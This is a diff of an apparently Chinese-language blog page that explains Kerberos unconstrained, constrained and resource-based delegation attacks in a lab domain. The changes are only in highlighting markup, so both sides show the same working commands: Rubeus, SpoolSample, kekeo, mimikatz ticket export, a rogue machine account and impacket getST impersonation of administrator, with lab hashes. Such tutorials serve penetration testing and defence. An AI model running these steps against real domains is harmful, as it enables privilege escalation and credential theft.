@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -291,11 +291,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#WIN7使用Rubeus开启监听来自其他主机的TGT</span>
-<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="err">:</span><span class="n">1</span> <span class="p">/</span><span class="n">filteruser</span><span class="err">:</span><span class="n">xx</span>
-<span class="c">#SpoolSample让指定机器访问WIN7进行身份验证</span>
-<span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">dc</span> <span class="n">win7</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#WIN7使用Rubeus开启监听来自其他主机的TGT</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="err">:</span><span class="n">1</span> <span class="p">/</span><span class="n">filteruser</span><span class="err">:</span><span class="n">xx</span>
+</span></span><span class="line"><span class="cl"><span class="c">#SpoolSample让指定机器访问WIN7进行身份验证</span>
+</span></span><span class="line"><span class="cl"><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">dc</span> <span class="n">win7</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="约束委派"><a href="#约束委派" class="anchor-link">#</a><a href="#contents:约束委派" class="headings">约束委派</a></h2>
 <p>微软在Windows 2003上发布了约束委派。 其中包括一组Kerberos协议扩展（S4U2Self和S4U2Proxy）。需要SeEnableDelegation特权才能配置约束和非约束委派。</p>
@@ -326,9 +326,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#查询useraccountcontrol属性，如果选择了&#34;使用任何身份验证协议&#34;,则该属性才有TRUSTED_TO_AUTH_FOR_DELEGATION字段</span>
-<span class="nb">Get-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查询useraccountcontrol属性，如果选择了&#34;使用任何身份验证协议&#34;,则该属性才有TRUSTED_TO_AUTH_FOR_DELEGATION字段</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="kekohttpsgithubcomgentilkiwikekeo"><a href="#kekohttpsgithubcomgentilkiwikekeo" class="anchor-link">#</a><a href="#contents:kekohttpsgithubcomgentilkiwikekeo" class="headings"><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">keko</a></a></h3>
 <p>环境：<code>PC-JACK-0DAY$</code>账户配置了到owa2010sp3的cifs服务约束委派。</p>
@@ -342,13 +342,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#请求PC-JACK-0DAY$的TGT</span>
-<span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">NTLM</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span>
-<span class="c">#获取访问目标的TGS （S4U2Self和S4U2Proxy过程的结合）</span>
-<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span>
-<span class="c">#PTT</span>
-<span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_cifs</span><span class="p">~</span><span class="n">OWA2010SP3</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#请求PC-JACK-0DAY$的TGT</span>
+</span></span><span class="line"><span class="cl"><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">NTLM</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span>
+</span></span><span class="line"><span class="cl"><span class="c">#获取访问目标的TGS （S4U2Self和S4U2Proxy过程的结合）</span>
+</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span>
+</span></span><span class="line"><span class="cl"><span class="c">#PTT</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_cifs</span><span class="p">~</span><span class="n">OWA2010SP3</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>如果不知道服务用户的明文和NTLM Hash，但是有服务用户登陆的主机权限，可以从内存中把服务用户的TGT票据 dump出来</p>
 <div class="highlight"><div class="chroma">
@@ -359,11 +359,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#导出TGT</span>
-<span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::tickets /export&#34;</span>
-<span class="c">#直接tgs::s4u，再导入到内存中</span>
-<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">3e7</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">40e00000-PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@krbtgt</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#导出TGT</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::tickets /export&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c">#直接tgs::s4u，再导入到内存中</span>
+</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">3e7</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">40e00000-PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@krbtgt</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="rubeus"><a href="#rubeus" class="anchor-link">#</a><a href="#contents:rubeus" class="headings">rubeus</a></h3>
 <div class="highlight"><div class="chroma">
@@ -371,8 +371,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span> <span class="p">/</span><span class="n">ptt</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="anchor-link">#</a><a href="#contents:基于资源的约束委派" class="headings">基于资源的约束委派</a></h2>
 <p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
@@ -409,10 +409,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#利用MachineAccountQuota创建新的计算机帐户（新的计算机帐户默认注册RestrictedKrbHost/domain和 HOST/domain这两个SPN）。</span>
-<span class="c">#添加一个密码qweasd.123,用户名为matty的机器账户</span>
-<span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">matty</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;qweasd.123&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#利用MachineAccountQuota创建新的计算机帐户（新的计算机帐户默认注册RestrictedKrbHost/domain和 HOST/domain这两个SPN）。</span>
+</span></span><span class="line"><span class="cl"><span class="c">#添加一个密码qweasd.123,用户名为matty的机器账户</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">matty</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;qweasd.123&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -440,26 +440,26 @@
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#查看jerry用户对PC-JACK-0DAY对象的权限（如果没有权限，什么都不会返回）</span>
-<span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-1812960810-2335050734-3517558805-1128&#34;</span><span class="p">}</span>
-
-<span class="c">#获取matty的SID</span>
-<span class="nb">Get-DomainComputer</span> <span class="n">-Identity</span> <span class="n">matty</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
-<span class="c">#sid是matty的</span>
-<span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1812960810-2335050734-3517558805-1181)&#34;</span>
-<span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
-<span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
-<span class="c">#添加PC-JACK-0DAY$属性msDS-AllowedToActOnBehalfOfOtherIdentity，并设置matty到PC-JACK-0DAY的委派</span>
-<span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
-<span class="c">#查看是否成功添加</span>
-<span class="nb">Get-DomainComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
-<span class="c">#清除msds-allowedtoactonbehalfofotheridentity属性的值</span>
-<span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Clear</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="n">-Verbose</span>
-
-<span class="c">#方法二 使用[Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
-<span class="nb">Set-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">matty</span><span class="p">$</span>
-<span class="nb">Get-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查看jerry用户对PC-JACK-0DAY对象的权限（如果没有权限，什么都不会返回）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-1812960810-2335050734-3517558805-1128&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#获取matty的SID</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">-Identity</span> <span class="n">matty</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+</span></span><span class="line"><span class="cl"><span class="c">#sid是matty的</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1812960810-2335050734-3517558805-1181)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c">#添加PC-JACK-0DAY$属性msDS-AllowedToActOnBehalfOfOtherIdentity，并设置matty到PC-JACK-0DAY的委派</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看是否成功添加</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
+</span></span><span class="line"><span class="cl"><span class="c">#清除msds-allowedtoactonbehalfofotheridentity属性的值</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Clear</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#方法二 使用[Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">matty</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -477,16 +477,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#获取matty$用户的hash（知道密码可以本地生成）</span>
-<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
-
-<span class="c">#请求PC-JACK-0DAY机器的cifs票据</span>
-<span class="c">#Rubeus </span>
-<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">754234C8F5BF1F736099B0BEED55B052</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
-<span class="c">#Impacket</span>
-<span class="n">python3</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">matty</span><span class="p">$</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span>
-<span class="c">#然后可以利用psexec横向（Windows上还需要申请HOST票据才能利用psexec，impacket不用）</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#获取matty$用户的hash（知道密码可以本地生成）</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#请求PC-JACK-0DAY机器的cifs票据</span>
+</span></span><span class="line"><span class="cl"><span class="c">#Rubeus </span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">754234C8F5BF1F736099B0BEED55B052</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#Impacket</span>
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">matty</span><span class="p">$</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span>
+</span></span><span class="line"><span class="cl"><span class="c">#然后可以利用psexec横向（Windows上还需要申请HOST票据才能利用psexec，impacket不用）</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
